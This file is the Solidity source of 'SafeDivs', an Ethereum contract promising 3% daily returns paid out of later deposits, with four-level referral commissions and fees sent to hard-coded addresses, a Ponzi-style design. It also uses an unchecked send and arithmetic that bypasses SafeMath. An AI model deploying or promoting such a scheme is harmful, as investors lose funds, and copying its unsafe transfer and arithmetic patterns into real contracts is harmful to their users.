1 pragma solidity ^0.4.24;
2 
3 /***********************************************************
4  * SafeDivs contract
5  *  - GAIN 3% PER 24 HOURS (every 5900 blocks)
6  * 
7  *  http://www.safedivs.com
8  ***********************************************************/
9 
10 /***********************************************************
11  * @title SafeMath v0.1.9
12  * @dev Math operations with safety checks that throw on error
13  * change notes:  original SafeMath library from OpenZeppelin modified by Inventor
14  * - added sqrt
15  * - added sq
16  * - added pwr 
17  * - changed asserts to requires with error log outputs
18  * - removed div, its useless
19  ***********************************************************/
20  library SafeMath {
21     /**
22     * @dev Multiplies two numbers, throws on overflow.
23     */
24     function mul(uint256 a, uint256 b) 
25         internal 
26         pure 
27         returns (uint256 c) 
28     {
29         if (a == 0) {
30             return 0;
31         }
32         c = a * b;
33         require(c / a == b, "SafeMath mul failed");
34         return c;
35     }
36 
37     /**
38     * @dev Integer division of two numbers, truncating the quotient.
39     */
40     function div(uint256 a, uint256 b) internal pure returns (uint256) {
41         // assert(b > 0); // Solidity automatically throws when dividing by 0
42         uint256 c = a / b;
43         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
44         return c;
45     }
46     
47     /**
48     * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
49     */
50     function sub(uint256 a, uint256 b)
51         internal
52         pure
53         returns (uint256) 
54     {
55         require(b <= a, "SafeMath sub failed");
56         return a - b;
57     }
58 
59     /**
60     * @dev Adds two numbers, throws on overflow.
61     */
62     function add(uint256 a, uint256 b)
63         internal
64         pure
65         returns (uint256 c) 
66     {
67         c = a + b;
68         require(c >= a, "SafeMath add failed");
69         return c;
70     }
71     
72     /**
73      * @dev gives square root of given x.
74      */
75     function sqrt(uint256 x)
76         internal
77         pure
78         returns (uint256 y) 
79     {
80         uint256 z = ((add(x,1)) / 2);
81         y = x;
82         while (z < y) 
83         {
84             y = z;
85             z = ((add((x / z),z)) / 2);
86         }
87     }
88     
89     /**
90      * @dev gives square. multiplies x by x
91      */
92     function sq(uint256 x)
93         internal
94         pure
95         returns (uint256)
96     {
97         return (mul(x,x));
98     }
99     
100     /**
101      * @dev x to the power of y 
102      */
103     function pwr(uint256 x, uint256 y)
104         internal 
105         pure 
106         returns (uint256)
107     {
108         if (x==0)
109             return (0);
110         else if (y==0)
111             return (1);
112         else 
113         {
114             uint256 z = x;
115             for (uint256 i=1; i < y; i++)
116                 z = mul(z,x);
117             return (z);
118         }
119     }
120 }
121 
122 /***********************************************************
123  * SDDatasets library
124  ***********************************************************/
125 library SDDatasets {
126     struct Player {
127         address addr;   // player address
128         uint256 invested;    //
129         uint256 atBlock;    // 
130         uint256 payEth;
131         uint256 aff;    // affiliate vault
132         uint256 laff;   // 上级用户
133         uint256 aff1sum; //以下是邀请奖励，直接发到自己的账户
134         uint256 aff2sum;
135         uint256 aff3sum;
136         uint256 aff4sum;
137     }
138 }
139 
140 contract SafeDivs {
141     using SafeMath              for *;
142 
143     address public devAddr_ = address(0xe6CE2a354a0BF26B5b383015B7E61701F6adb39C);
144     address public affiAddr_ = address(0x08F521636a2B117B554d04dc9E54fa4061161859);
145 
146     //合作伙伴
147     address public partnerAddr_ = address(0x08962cDCe053e2cE92daE22F3dE7538F40dAEFC2);
148 
149     bool public activated_ = false;
150     modifier isActivated() {
151         require(activated_ == true, "its not active yet."); 
152         _;
153     }
154 
155     function activate() isAdmin() public {
156         require(address(devAddr_) != address(0x0), "Must setup devAddr_.");
157         require(address(partnerAddr_) != address(0x0), "Must setup partnerAddr_.");
158         require(address(affiAddr_) != address(0x0), "Must setup affiAddr_.");
159 
160         require(activated_ == false, "Only once");
161         activated_ = true ;
162 	}
163 	
164     mapping(address => uint256)     private g_users ;
165     function initUsers() private {
166         g_users[msg.sender] = 9 ;
167         
168         uint256 pId = G_NowUserId;
169         pIDxAddr_[msg.sender] = pId;
170         player_[pId].addr = msg.sender;
171     }
172     modifier isAdmin() {
173         uint256 role = g_users[msg.sender];
174         require((role==9), "Must be admin.");
175         _;
176     }	
177 	
178     uint256 public G_NowUserId = 1000; //当前用户编号
179     uint256 public G_AllEth = 0;
180     
181     mapping (address => uint256) public pIDxAddr_;  
182     mapping (uint256 => SDDatasets.Player) public player_; 
183 	
184 	function GetIdByAddr(address addr) public 
185 	    view returns(uint256)
186 	{
187 	    return pIDxAddr_[addr];
188 	}
189 	
190 
191 	function GetPlayerById(uint256 uid) public 
192 	    view returns(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256)
193 	{
194 	    SDDatasets.Player player = player_[uid];
195 	    return
196 	    (
197 	        player.invested,
198 	        player.atBlock,
199 	        player.payEth,
200 	        player.aff,
201 	        player.laff,
202 	        player.aff1sum,
203 	        player.aff2sum,
204 	        player.aff3sum,
205 	        player.aff4sum
206 	    );
207 	}
208 
209     constructor() public {
210 
211         initUsers();
212     }
213 	
214 	function register_(uint256 _affCode) private{
215         G_NowUserId = G_NowUserId.add(1);
216         
217         address _addr = msg.sender;
218         
219         pIDxAddr_[_addr] = G_NowUserId;
220 
221         player_[G_NowUserId].addr = _addr;
222         player_[G_NowUserId].laff = _affCode;
223         
224         uint256 _affID1 = _affCode;
225         uint256 _affID2 = player_[_affID1].laff;
226         uint256 _affID3 = player_[_affID2].laff;
227         uint256 _affID4 = player_[_affID3].laff;
228         
229         player_[_affID1].aff1sum = player_[_affID1].aff1sum.add(1);
230         player_[_affID2].aff2sum = player_[_affID2].aff2sum.add(1);
231         player_[_affID3].aff3sum = player_[_affID3].aff3sum.add(1);
232         player_[_affID4].aff4sum = player_[_affID4].aff4sum.add(1);
233 	}
234 	    
235     function register(uint256 _affCode) public payable{
236         
237         require(msg.value == 0, "registration fee is 0 ether, please set the exact amount");
238         require(_affCode != 0, "error aff code");
239         require(player_[_affCode].addr != address(0x0), "error aff code");
240         
241         register_(_affCode);
242     }	
243     
244     function invest() public payable {
245         
246 		//get uid
247 		uint256 uid = pIDxAddr_[msg.sender];
248 		if (uid == 0) {
249 			register_(1000);
250 			uid = G_NowUserId;
251 		}
252 		
253         // if sender (aka YOU) is invested more than 0 ether
254         if (player_[uid].invested != 0) {
255             // calculate profit amount as such:
256             // amount = (amount invested) * 3% * (blocks since last transaction) / 5900
257             // 5900 is an average block count per day produced by Ethereum blockchain
258             uint256 amount = player_[uid].invested * 3 / 100 * (block.number - player_[uid].atBlock) / 5900;
259 
260             // send calculated amount of ether directly to sender (aka YOU)
261             address sender = msg.sender;
262             sender.send(amount);
263             
264             player_[uid].payEth += amount;
265         }
266 
267         G_AllEth = G_AllEth.add(msg.value);
268         
269         // record block number and invested amount (msg.value) of this transaction
270         player_[uid].atBlock = block.number;
271         player_[uid].invested += msg.value;
272         
273         if (msg.value > 1000000000) {
274             distributeRef(msg.value, player_[uid].laff);
275             
276             uint256 devFee = (msg.value.mul(2)).div(100);
277             devAddr_.transfer(devFee);
278             
279             uint256 partnerFee = (msg.value.mul(2)).div(100);
280             partnerAddr_.transfer(partnerFee);
281         }        
282     }
283     
284     // this function called every time anyone sends a transaction to this contract
285     function () isActivated() external payable {
286         invest();
287     }    
288 	
289     function distributeRef(uint256 _eth, uint256 _affID) private{
290         
291         uint256 _allaff = (_eth.mul(16)).div(100);
292         
293         //四级返佣
294         uint256 _affID1 = _affID;
295         uint256 _affID2 = player_[_affID1].laff;
296         uint256 _affID3 = player_[_affID2].laff;
297         uint256 _affID4 = player_[_affID3].laff;
298         uint256 _aff = 0;
299 
300         if (_affID1 != 0) {   
301             _aff = (_eth.mul(10)).div(100);
302             _allaff = _allaff.sub(_aff);
303             player_[_affID1].aff = _aff.add(player_[_affID1].aff);
304             player_[_affID1].addr.transfer(_aff);
305         }
306 
307         if (_affID2 != 0) {   
308             _aff = (_eth.mul(3)).div(100);
309             _allaff = _allaff.sub(_aff);
310             player_[_affID2].aff = _aff.add(player_[_affID2].aff);
311             player_[_affID2].addr.transfer(_aff);
312         }
313 
314         if (_affID3 != 0) {   
315             _aff = (_eth.mul(2)).div(100);
316             _allaff = _allaff.sub(_aff);
317             player_[_affID3].aff = _aff.add(player_[_affID3].aff);
318             player_[_affID3].addr.transfer(_aff);
319        }
320 
321         if (_affID4 != 0) {   
322             _aff = (_eth.mul(1)).div(100);
323             _allaff = _allaff.sub(_aff);
324             player_[_affID4].aff = _aff.add(player_[_affID4].aff);
325             player_[_affID4].addr.transfer(_aff);
326             
327         }
328 
329         if(_allaff > 0 ){
330             affiAddr_.transfer(_allaff);
331         }          
332     }	
333 }